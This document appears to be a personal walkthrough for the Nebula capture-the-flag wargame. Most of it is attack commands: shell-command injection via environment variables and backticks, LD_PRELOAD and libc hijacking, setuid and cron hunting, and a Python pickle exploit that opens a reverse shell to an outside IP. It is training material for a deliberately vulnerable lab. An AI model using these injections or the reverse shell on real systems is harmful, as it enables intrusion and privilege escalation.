NEBULA WALKTHROUGH
==================

http://hatriot.github.io/blog/2013/03/30/nebula-solutions-all-levels/

# level00
```
find / -type f -executable -user flag00 2>/dev/null
```

# level01
```
ltrace flag01
strace flag01
ptrace flag01
ln -s `which getflag` /home/level01/echo
export PATH=/home/level01:$PATH
```

# level02
```
ltrace ...
export USER="; getflag;"
```

# level03
```
find / -writable 2>/dev/null | grep -vE '^(/dev/|/proc/|/home/level03/)'
find /var/spool | grep cron
find /etc/cron*
```

# level06
```
cut -f2 -d: /etc/passwd | sort -u # searching for legacy unix passwords
```

# level07
```
ps -efHj | grep flag07
```

# level08
```
tcpflow -r file.cap
wireshark -> follow tcp flow
```

# level09
```
preg_replace(/.../e)
`$pass_through`
```

# level10
```
access() -> open() race condition
```

# level11
```
boomerang flag11  # disasm
gdb               # runtime understanding
  start
  set disassembly-flavor intel
  layout asm
  break main
  break *main+0000
  print $edx
  x/10c $edx 
  stepi           # si
  nexti           # ni 
  info registers  # i r
  continue
  stop
```

# level12
```
nc $IP $PORT "$(getflag) >&2"
```

# level13
```
gdb ./flag13
ldd ./flag13
nano moduid.c
  #include <sys/types.h>
  uid_t getuid(void) { return (1000); }
gcc -shared moduid.c -o moduid.so
cd ../level13
cp ../flag13/flag13 ./      # нужно очистить SUID бит, иначе LD_PRELOAD работает непонятно
LD_PRELOAD=$PWD/moduid.so ldd ./flag13
LD_PRELOAD=$PWD/moduid.so ./flag13
```

# level14
```
gcc -Wall -fPIC -o /tmp/libc.o -c /tmp/lib.c
gcc -shared -W1,-Bstatic,-soname,libc.so.6 -o /var/tmp/flag15/libc.so.6 /tmp/libc.o -static
```

# level16
```
$username ...=... UPPER CASE
@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;

nano /tmp/PWN
  id > /tmp/result
  
1) `/*/PWN`
2) $(/*/PWN)
3) ";{/*/PWN};
4) ";/*/PWN;
```

# level17
```
import socket
cmd = "cos\nsystem\n(S'/bin/bash -i > /dev/tcp/192.168.1.74/5555 0>&1'\ntR.\n"
try:
    sock = socket.socket()
    sock.connect(('192.168.1.206', 10007))
    data = sock.recv(512)
    print 'Got: ', data
    sock.send(cmd)
    sock.close()
except Exception, e: print e
```

